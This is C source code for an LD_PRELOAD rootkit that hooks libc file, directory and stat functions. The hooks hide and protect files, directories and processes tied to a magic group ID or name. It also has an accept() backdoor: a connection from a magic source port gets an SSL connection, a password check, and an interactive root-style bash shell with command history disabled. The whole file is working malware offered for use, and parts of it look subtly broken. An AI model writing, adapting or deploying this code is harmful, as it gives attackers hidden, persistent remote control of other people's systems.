#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include <limits.h>
#include <errno.h>

#include <openssl/md5.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#include "config.h"

#define BUFSIZZ 1024
#define F_DUPFD		0	/* Duplicate file descriptor.  */
#define F_GETFD		1	/* Get file descriptor flags.  */
#define F_SETFD		2	/* Set file descriptor flags.  */
#define F_GETFL		3	/* Get file status flags.  */
#define F_SETFL		4	/* Set file status flags.  */
#define O_NONBLOCK	  04000
#define O_NDELAY	O_NONBLOCK


static void init (void) __attribute__ ((constructor));

static int (*old_fxstat)(int ver, int fildes, struct stat *buf);
static int (*old_fxstat64)(int ver, int fildes, struct stat64 *buf);
static int (*old_lxstat)(int ver, const char *file, struct stat *buf);
static int (*old_lxstat64)(int ver, const char *file, struct stat64 *buf);
static int (*old_open)(const char *pathname, int flags, mode_t mode);
static int (*old_rmdir)(const char *pathname);
static int (*old_unlink)(const char *pathname);
static int (*old_unlinkat)(int dirfd, const char *pathname, int flags);
static int (*old_xstat)(int ver, const char *path, struct stat *buf);
static int (*old_xstat64)(int ver, const char *path, struct stat64 *buf);

static int (*old_accept)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

static DIR *(*old_fdopendir)(int fd);
static DIR *(*old_opendir)(const char *name);

void enterpass(SSL *ssl);
SSL_CTX* InitCTX(void);
void getMD5(const char *ori,int len,char *buf);
void read_write(SSL *ssl,int sock);
int remap_pipe_stdin_stdout(int rpipe, int wpipe);
static int (*old_SSL_library_init)(void);
static void (*old_SSL_load_error_strings)(void);
static SSL_METHOD* (*old_SSLv3_client_method)(void);
static SSL_CTX* (*old_SSL_CTX_new)(const SSL_METHOD *meth);

static struct dirent *(*old_readdir)(DIR *dir);
static struct dirent64 *(*old_readdir64)(DIR *dir);
char *argv[] = { "bash", "-i", NULL };
char *envp[] = { "TERM=linux", "PS1=[root@remote-server]#", "BASH_HISTORY=/dev/null",
                 "HISTORY=/dev/null", "history=/dev/null", "HOME=/usr/sbin/dnsdyn","HISTFILE=/dev/null",
                 "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", NULL };


void init(void)
{
	#ifdef DEBUG
	printf("[-] ld_poison loaded.\n");
	#endif

	old_fxstat = dlsym(RTLD_NEXT, "__fxstat");
	old_fxstat64 = dlsym(RTLD_NEXT, "__fxstat64");
	old_lxstat = dlsym(RTLD_NEXT, "__lxstat");
	old_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
	old_open = dlsym(RTLD_NEXT,"open");
	old_rmdir = dlsym(RTLD_NEXT,"rmdir");
	old_unlink = dlsym(RTLD_NEXT,"unlink");	
	old_unlinkat = dlsym(RTLD_NEXT,"unlinkat");
	old_xstat = dlsym(RTLD_NEXT, "__xstat");
	old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
	
	old_fdopendir = dlsym(RTLD_NEXT, "fdopendir");
	old_opendir = dlsym(RTLD_NEXT, "opendir");
	
	old_readdir = dlsym(RTLD_NEXT, "readdir");
	old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
	
	old_accept = dlsym(RTLD_NEXT, "accept");
	
	old_SSL_library_init = dlsym(RTLD_NEXT, "SSL_library_init");
	old_SSL_load_error_strings = dlsym(RTLD_NEXT, "SSL_load_error_strings");
	old_SSLv3_client_method = dlsym(RTLD_NEXT, "SSLv3_client_method");
	old_SSL_CTX_new = dlsym(RTLD_NEXT, "SSL_CTX_new");
	
}
void enterpass(SSL *ssl){
  	//char *prompt="Password [displayed to screen]: ";
  	char *motd="<< Welcome >>\n";
  	char buffer[64]={0x00};
	
  	//write(s,banner,strlen(banner));
  	//write(s,prompt,strlen(prompt));
  	//read(s,buffer,sizeof(buffer));
  	SSL_read(ssl,buffer,sizeof(buffer)-1);

  	/*Hash password*/
	char trans[SALT_LENGTH+33] = {'\0'};
  	char tmp[3]={'\0'},buf[33]={'\0'},hash[33]={'\0'};
	int i;
	for(i=0;i<strlen(buffer);i++){
		if(buffer[i]==0x00){
			break;
		}
	}
	if(i>2)
		i--;
#ifdef DEBUG
	sprintf(tmp, "%d",i);
	SSL_write(ssl,tmp,1);
	SSL_write(ssl,"->i\n",4);
#endif

  	getMD5(buffer,i,buf);

#ifdef DEBUG
	SSL_write(ssl,buf,strlen(buf));
	SSL_write(ssl,"->buf\n",6);
#endif
	strncpy(trans,_SALT_,SALT_LENGTH);
	for(i=0;i<32;i++){
			trans[SALT_LENGTH+i]=buf[i];
	}
#ifdef DEBUG
	SSL_write(ssl,trans,strlen(trans));
	SSL_write(ssl,"->trans\n",8);
#endif

	getMD5(trans,SALT_LENGTH+32,hash);
	
	sprintf(tmp, "%d",strlen(buf));
	
#ifdef DEBUG
	SSL_write(ssl,tmp,2);
	SSL_write(ssl,"->buflen\n",9);
	SSL_write(ssl,hash,strlen(hash));
	SSL_write(ssl,"->hash\n",7);
#endif
	/*End Hash Password*/
	
  	if(!strncmp(hash, _RPASSWORD_, strlen(_RPASSWORD_))) {
   		 SSL_write(ssl,motd,strlen(motd));
  	}else {
   	 	//write(s,"Wrong!\n", 7);
   	 	//close(s); 
#ifdef DEBUG
		SSL_write(ssl,"Wrong!\n", 7);
#endif
   		_exit(0);
  	}
}

/*
* transfer char to its md5 char be know that buf must init with buf[33]={'\0'};
*/
void getMD5(const char *ori,int len,char *buf){
	unsigned char md[16];
	char tmp[3]={'\0'};
	int i;
	unsigned char tt[len];
	for(i=0;i<len;i++){
		tt[i] = ori[i];
	}
	MD5(tt,len,md);
	for (i = 0; i < 16; i++){
		sprintf(tmp,"%2.2x",md[i]);
		strcat(buf,tmp);
	}
	return;
}
/*
 * Initialize SSL library / algorithms
 */
SSL_CTX* InitCTX(void)
{   SSL_METHOD *method;
    SSL_CTX *ctx;

    old_SSL_library_init();

    old_OpenSSL_add_all_algorithms();		/* Load cryptos, et.al. */
    old_SSL_load_error_strings();			/* Bring in and register error messages */
    method = old_SSLv3_client_method();		/* Create new client-method instance */
    ctx = old_SSL_CTX_new(method);			/* Create new context */
    if ( ctx == NULL )
    {
        ERR_print_errors_fp(stderr);
        abort();
    }
    return ctx;
}


int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
	#ifdef DEBUG
		printf("accept hooked.\n");
	#endif
	int cli;
	cli = old_accept(sockfd,addr, addrlen);
	if( (addr->sa_family == AF_INET) ){
		struct sockaddr_in *cli_addr = (struct sockaddr_in *)addr;
		unsigned int th_sport = ntohl(cli_addr->sin_port);
		th_sport = th_sport>>16;
		printf("th_sport:%d\n",th_sport);
		if( (cli_addr->sin_port == htons(_MAGIC_PORT_)) ){
			pid_t child;
			if(cli<0)
				return cli;
			printf("magic-client-in\n");
			if((child=fork())==0){
			/*old none-crypted style
			   	close(sockfd);
			  	dup2(cli,0);
			   	dup2(cli,1);
			   	dup2(cli,2);
				//close(0);
				//fid = fcntl(cli, F_DUPFD, 0);
			   	//enterpass(cli);
			   	execve("/bin/bash", argv, envp);
				printf("disConnected.");
			   	close(child);
			   	close(cli);
				_exit(0);
			*/
				SSL_CTX *ctx;
				SSL *ssl;
				ctx = InitCTX();
				ssl = SSL_new(ctx);
				SSL_set_fd(ssl,cli);
				cli = SSL_get_fd(ssl);
				if ( SSL_accept(ssl) == -1 ){
					return cli;
				}
				else{
					printf("SSL-ACCEPTED\n");
					enterpass(ssl);
					int	writepipe[2] = {-1,-1},					/* parent -> child */
					readpipe [2] = {-1,-1};						/* child -> parent */
					pid_t	childpid;

					/*------------------------------------------------------------------------
					* CREATE THE PAIR OF PIPES
					*
					* Pipes have two ends but just one direction: to get a two-way
					* conversation you need two pipes. It's an error if we cannot make
					* them both, and we define these macros for easy reference.
					*/
					writepipe[0] = -1;

					if ( pipe(readpipe) < 0  ||  pipe(writepipe) < 0 )
					{
						/* FATAL: cannot create pipe */
						/* close readpipe[0] & [1] if necessary */
					}
					#define	PARENT_READ	readpipe[0]
					#define	CHILD_WRITE	readpipe[1]
					#define CHILD_READ	writepipe[0]
					#define PARENT_WRITE	writepipe[1]
					signal(SIGCHLD, SIG_IGN);
					if ( (childpid = fork()) < 0)
					{
						/* FATAL: cannot fork child */
					}
					else if ( childpid == 0 )					/* in the child */
					{
						close(PARENT_WRITE);
						close(PARENT_READ);

						//dup2(CHILD_READ,  0);  close(CHILD_READ);
						//dup2(CHILD_WRITE, 1);  close(CHILD_WRITE);
						dup2(CHILD_WRITE,2);//for error
						remap_pipe_stdin_stdout(CHILD_READ,CHILD_WRITE);
																
						/* do child stuff */
						//read_write(ssl,sock);
						execve("/bin/bash", argv, envp);
						//printf("bash close");
						close(childpid);
						_exit(0);
					}
					else				/* in the parent */
					{
						close(CHILD_READ);
						close(CHILD_WRITE);
										
						//dup2(PARENT_READ, 0);
						//dup2(PARENT_WRITE, 1);
						remap_pipe_stdin_stdout(PARENT_READ,PARENT_WRITE);
						/* do parent stuff */
						read_write(ssl,cli);
										
						//wait();

					}							
					close(cli);
					SSL_CTX_free(ctx);
				}
				close(child);
				_exit(0);	
			}else if(child<0){
				return cli;
			}
			wait(child);
			return -1;
		}
	}
	return cli;
}

#ifndef TRUE
#  define TRUE 1
#endif

#ifndef FALSE
#  define FALSE 0
#endif

/*------------------------------------------------------------------------
 * Every time we run a dup2(), we always close the old FD, so this macro
 * runs them both together and evaluates to TRUE if it all went OK and 
 * FALSE if not.
 */
#define	DUP2CLOSE(oldfd, newfd)	(dup2(oldfd, newfd) == 0  &&  close(oldfd) == 0)

int remap_pipe_stdin_stdout(int rpipe, int wpipe)
{
	/*------------------------------------------------------------------
	 * CASE [A]
	 *
	 * This is the trivial case that probably never happens: the two FDs
	 * are already in the right place and we have nothing to do. Though
	 * this probably doesn't happen much, it's guaranteed that *doing*
	 * any shufflingn would close descriptors that shouldn't have been.
	 */
	if ( rpipe == 0  &&  wpipe == 1 )
		return TRUE;

	/*----------------------------------------------------------------
	 * CASE [B] and [C]
	 *
	 * These two have the same handling but not the same rules. In case
	 * [C] where both FDs are "out of the way", it doesn't matter which
	 * of the FDs is closed first, but in case [B] it MUST be done in
	 * this order.
	 */
	if ( rpipe >= 1  &&  wpipe > 1 )
	{
		return DUP2CLOSE(rpipe, 0)
		    && DUP2CLOSE(wpipe, 1);
	}


	/*----------------------------------------------------------------
	 * CASE [D]
	 * CASE [E]
	 *
 	 * In these cases, *one* of the FDs is already correct and the other
	 * one can just be dup'd to the right place:
	 */
	if ( rpipe == 0  &&  wpipe >= 1 )
		return DUP2CLOSE(wpipe, 1);

	if ( rpipe  >= 1  &&  wpipe == 1 )
		return DUP2CLOSE(rpipe, 0);


	/*----------------------------------------------------------------
	 * CASE [F]
	 *
	 * Here we have the write pipe in the read slot, but the read FD
	 * is out of the way: this means we can do this in just two steps
	 * but they MUST be in this order.
	 */
	if ( rpipe >= 1   &&  wpipe == 0 )
	{
		return DUP2CLOSE(wpipe, 1)
		    && DUP2CLOSE(rpipe, 0);
	}

	/*----------------------------------------------------------------
	 * CASE [G]
	 *
	 * This is the trickiest case because the two file descriptors  are
	 * *backwards*, and the only way to make it right is to make a
	 * third temporary FD during the swap.
	 */
	if ( rpipe == 1  &&  wpipe == 0 )
	{
	const int tmp = dup(wpipe);		/* NOTE! this is not dup2() ! */

		return	tmp > 1
		    &&  close(wpipe)   == 0
		    &&  DUP2CLOSE(rpipe, 0)
		    &&  DUP2CLOSE(tmp,   1);
	}

	/* SHOULD NEVER GET HERE */

	return  FALSE;
}

/* A simple error and exit routine*/
int err_exit(char *string)
{
#ifdef DEBUG
    fprintf(stderr,"%s\n",string);
#endif
    exit(0);
}

/* Print SSL errors and exit*/
int berr_exit(char *string)
{
    //BIO_printf(bio_err,"%s\n",string);
    //ERR_print_errors(bio_err);
#ifdef DEBUG
    fprintf(stderr,"%s\n",string);
#endif
    exit(0);
}

/* Read from the keyboard and write to the server
   Read from the server and write to the keyboard

   we use select() to multiplex
*/
void read_write(SSL *ssl,int sock)
  {
    int width;
    int r,c2sl=0,c2s_offset=0;
    int read_blocked_on_write=0,write_blocked_on_read=0,read_blocked=0;
    fd_set readfds,writefds;
    int shutdown_wait=0;
    char c2s[BUFSIZZ],s2c[BUFSIZZ];
    int ofcmode;
    
    /*First we make the socket nonblocking*/
    ofcmode=fcntl(sock,F_GETFL,0);
    ofcmode|=O_NDELAY;
    if(fcntl(sock,F_SETFL,ofcmode))
      err_exit("Couldn't make socket nonblocking");
    

    width=sock+1;
    while(1){
      FD_ZERO(&readfds);
      FD_ZERO(&writefds);

      FD_SET(sock,&readfds);

      /* If we're waiting for a read on the socket don't
         try to write to the server */
      if(!write_blocked_on_read){
        /* If we have data in the write queue don't try to
           read from stdin */
        if(c2sl || read_blocked_on_write)
          FD_SET(sock,&writefds);
        else
          FD_SET(fileno(stdin),&readfds);
      }
      
      r=select(width,&readfds,&writefds,0,0);
      if(r==0)
        continue;

      /* Now check if there's data to read */
      if((FD_ISSET(sock,&readfds) && !write_blocked_on_read) ||
        (read_blocked_on_write && FD_ISSET(sock,&writefds))){
        do {
          read_blocked_on_write=0;
          read_blocked=0;
          
          r=SSL_read(ssl,s2c,BUFSIZZ);
          
          switch(SSL_get_error(ssl,r)){
            case SSL_ERROR_NONE:
              /* Note: this call could block, which blocks the
                 entire application. It's arguable this is the
                 right behavior since this is essentially a terminal
                 client. However, in some other applications you
                 would have to prevent this condition */
              fwrite(s2c,1,r,stdout);
              break;
            case SSL_ERROR_ZERO_RETURN:
              /* End of data */
              if(!shutdown_wait)
                SSL_shutdown(ssl);
              goto end;
              break;
            case SSL_ERROR_WANT_READ:
              read_blocked=1;
              break;
              
              /* We get a WANT_WRITE if we're
                 trying to rehandshake and we block on
                 a write during that rehandshake.

                 We need to wait on the socket to be 
                 writeable but reinitiate the read
                 when it is */
            case SSL_ERROR_WANT_WRITE:
              read_blocked_on_write=1;
              break;
            default:
              berr_exit("SSL read problem");
          }

          /* We need a check for read_blocked here because
             SSL_pending() doesn't work properly during the
             handshake. This check prevents a busy-wait
             loop around SSL_read() */
        } while (SSL_pending(ssl) && !read_blocked);
      }
      
      /* Check for input on the console*/
      if(FD_ISSET(fileno(stdin),&readfds)){
        c2sl=read(fileno(stdin),c2s,BUFSIZZ);
        if(c2sl==0){
          shutdown_wait=1;
          if(SSL_shutdown(ssl))
            return;
        }
        c2s_offset=0;
      }

      /* If the socket is writeable... */
      if((FD_ISSET(sock,&writefds) && c2sl) ||
        (write_blocked_on_read && FD_ISSET(sock,&readfds))) {
        write_blocked_on_read=0;

        /* Try to write */
		 
        r=SSL_write(ssl,c2s+c2s_offset,c2sl);
		 //SSL_write(ssl,ps,strlen(ps));
          
        switch(SSL_get_error(ssl,r)){
          /* We wrote something*/
          case SSL_ERROR_NONE:
            c2sl-=r;
            c2s_offset+=r;
            break;
              
            /* We would have blocked */
          case SSL_ERROR_WANT_WRITE:
            break;

            /* We get a WANT_READ if we're
               trying to rehandshake and we block on
               write during the current connection.
               
               We need to wait on the socket to be readable
               but reinitiate our write when it is */
          case SSL_ERROR_WANT_READ:
            write_blocked_on_read=1;
            break;
              
              /* Some other error */
          default:	      
            berr_exit("SSL write problem");
        }
      }
    }
      
  end:
    //SSL_free(ssl);
    //close(sock);
    return;
  }


int fstat(int fd, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("fstat hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat(_STAT_VER, fd, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID ) {
		errno = ENOENT;
		return -1;
	}

	return old_fxstat(_STAT_VER, fd, buf);
}

int fstat64(int fd, struct stat64 *buf)
{
	struct stat64 s_fstat;

	#ifdef DEBUG
	printf("fstat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat64(_STAT_VER, fd, &s_fstat);
	if(s_fstat.st_gid == MAGIC_GID){
		errno = ENOENT;
		return -1;
	}
	
	return old_fxstat64(_STAT_VER, fd, buf);
}

int __fxstat(int ver, int fildes, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("__fxstat hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat(ver,fildes, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
	return old_fxstat(ver,fildes, buf);
}

int __fxstat64(int ver, int fildes, struct stat64 *buf)
{
	struct stat64 s_fstat;

	#ifdef DEBUG
	printf("__fxstat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat64(ver, fildes, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}

	return old_fxstat64(ver, fildes, buf);
}

int lstat(const char *file, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("lstat hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_lxstat(_STAT_VER, file, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID || strstr(file,CONFIG_FILE) || strstr(file,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat(_STAT_VER, file, buf);
}

int lstat64(const char *file, struct stat64 *buf)
{
	struct stat64 s_fstat;

	#ifdef DEBUG
	printf("lstat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_lxstat64(_STAT_VER, file, &s_fstat);

	if (s_fstat.st_gid == MAGIC_GID || strstr(file,CONFIG_FILE) || strstr(file,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat64(_STAT_VER, file, buf);
}

int __lxstat(int ver, const char *file, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("__lxstat hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_lxstat(ver, file, &s_fstat);

	if (s_fstat.st_gid == MAGIC_GID || strstr(file,CONFIG_FILE) || strstr(file,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat(ver, file, buf);
}

int __lxstat64(int ver, const char *file, struct stat64 *buf)
{
	struct stat64 s_fstat;

	#ifdef DEBUG
	printf("__lxstat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_lxstat64(ver, file, &s_fstat);
	
	#ifdef DEBUG
	printf("File: %s\n",file);
	printf("GID: %d\n",s_fstat.st_gid);
	#endif
	
	if(s_fstat.st_gid == MAGIC_GID || strstr(file,CONFIG_FILE) || strstr(file,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat64(ver, file, buf);
}

int open(const char *pathname, int flags, mode_t mode)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("open hooked.\n");
	#endif
	
	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(_STAT_VER, pathname, &s_fstat);
	
	if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL) || (strstr(pathname, CONFIG_FILE) != NULL)) {
		errno = ENOENT;
		return -1;
	}

	return old_open(pathname,flags,mode);
}

int rmdir(const char *pathname)
{
	struct stat s_fstat;
	
	#ifdef DEBUG
	printf("rmdir hooked.\n");
	#endif
	
	memset(&s_fstat, 0, sizeof(stat));
	
	old_xstat(_STAT_VER, pathname, &s_fstat);
	
	if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL) || (strstr(pathname, CONFIG_FILE) != NULL)) {
		errno = ENOENT;
		return -1;
	}
	
	return old_rmdir(pathname);
}

int stat(const char *path, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("stat hooked\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(_STAT_VER, path, &s_fstat);
	
	#ifdef DEBUG
	printf("Path: %s\n",path);
	printf("GID: %d\n",s_fstat.st_gid);
	#endif
	
	if(s_fstat.st_gid == MAGIC_GID || strstr(path,CONFIG_FILE) || strstr(path,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_xstat(3, path, buf);
}

int stat64(const char *path, struct stat64 *buf)
{
	struct stat64 s_fstat;

	#ifdef DEBUG
	printf("stat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat64(_STAT_VER, path, &s_fstat);

	if (s_fstat.st_gid == MAGIC_GID || strstr(path,CONFIG_FILE) || strstr(path,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_xstat64(_STAT_VER, path, buf);
}

int __xstat(int ver, const char *path, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("xstat hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(ver,path, &s_fstat);

	#ifdef DEBUG
	printf("Path: %s\n",path);
	printf("GID: %d\n",s_fstat.st_gid);
	#endif 
	
	memset(&s_fstat, 0, sizeof(stat));

	if(s_fstat.st_gid == MAGIC_GID || strstr(path,CONFIG_FILE) || strstr(path,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_xstat(ver,path, buf);
}

int __xstat64(int ver, const char *path, struct stat64 *buf)
{
	struct stat64 s_fstat;
	
	#ifdef DEBUG
	printf("xstat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat64(ver,path, &s_fstat);

	#ifdef DEBUG
	printf("Path: %s\n",path);
	printf("GID: %d\n",s_fstat.st_gid);
	#endif 

	if(s_fstat.st_gid == MAGIC_GID || strstr(path,CONFIG_FILE) || strstr(path,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}
	
	return old_xstat64(ver,path, buf);
}

int unlink(const char *pathname)
{
	struct stat s_fstat;
	
	#ifdef DEBUG
	printf("unlink hooked.\n");
	#endif
	
	memset(&s_fstat, 0, sizeof(stat));
	
	old_xstat(_STAT_VER, pathname, &s_fstat);
	
	if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL) || (strstr(pathname, CONFIG_FILE) != NULL)) {
		errno = ENOENT;
		return -1;
	}
	
	return old_unlink(pathname);
}

int unlinkat(int dirfd, const char *pathname, int flags)
{
	struct stat s_fstat;
	
	#ifdef DEBUG
	printf("unlinkat hooked.\n");
	#endif
	
	memset(&s_fstat, 0, sizeof(stat));
	
	old_fxstat(_STAT_VER, dirfd, &s_fstat);
	
	if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL) || (strstr(pathname, CONFIG_FILE) != NULL)) {
		errno = ENOENT;
		return -1;
	}
	
	return old_unlinkat(dirfd, pathname, flags);
}

DIR *fdopendir(int fd)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("fdopendir hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat(_STAT_VER, fd, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return NULL;
	}

	return old_fdopendir(fd);
}

DIR *opendir(const char *name)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("opendir hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(_STAT_VER, name, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID || strstr(name,CONFIG_FILE) || strstr(name,MAGIC_DIR)) {
		//printf("name");
		errno = ENOENT;
		return NULL;
	}

	return old_opendir(name);
}

struct dirent *readdir(DIR *dirp)
{
	struct dirent *dir;
	struct stat s_fstat;
	
	memset(&s_fstat, 0, sizeof(stat));

	#ifdef DEBUG
	printf("readdir hooked.\n");
	#endif

	do {
		dir = old_readdir(dirp);
		
		if (dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0)) 
			continue;

		if(dir != NULL) {
	                char path[PATH_MAX + 1];
			snprintf(path,PATH_MAX,"/proc/%s",dir->d_name);
	                old_xstat(_STAT_VER, path, &s_fstat);
		}
	} while(dir && (strstr(dir->d_name, MAGIC_DIR) != 0 || strstr(dir->d_name, CONFIG_FILE) != 0 || s_fstat.st_gid == MAGIC_GID));
	//} while(dir && (strstr(dir->d_name, MAGIC_DIR) == NULL) && (strstr(dir->d_name, CONFIG_FILE) == NULL) && (s_fstat.st_gid != MAGIC_GID) );

	return dir;
}

struct dirent64 *readdir64(DIR *dirp)
{
	struct dirent64 *dir;
	struct stat s_fstat;
	
	memset(&s_fstat, 0, sizeof(stat));

	#ifdef DEBUG
	printf("readdir64 hooked.\n");
	#endif

	do {
		dir = old_readdir64(dirp);
		
		if (dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0))  
			continue;

		if(dir != NULL) {
	       char path[PATH_MAX + 1];
			snprintf(path,PATH_MAX,"/proc/%s",dir->d_name);
	       old_xstat(_STAT_VER, path, &s_fstat);
		}
	} while(dir && (strstr(dir->d_name, MAGIC_DIR) != 0 || strstr(dir->d_name, CONFIG_FILE) != 0 || s_fstat.st_gid == MAGIC_GID));
	//} while(dir && (strstr(dir->d_name, MAGIC_DIR) == NULL) && (strstr(dir->d_name, CONFIG_FILE) == NULL) && (s_fstat.st_gid != MAGIC_GID) );
	
	return dir;
}	
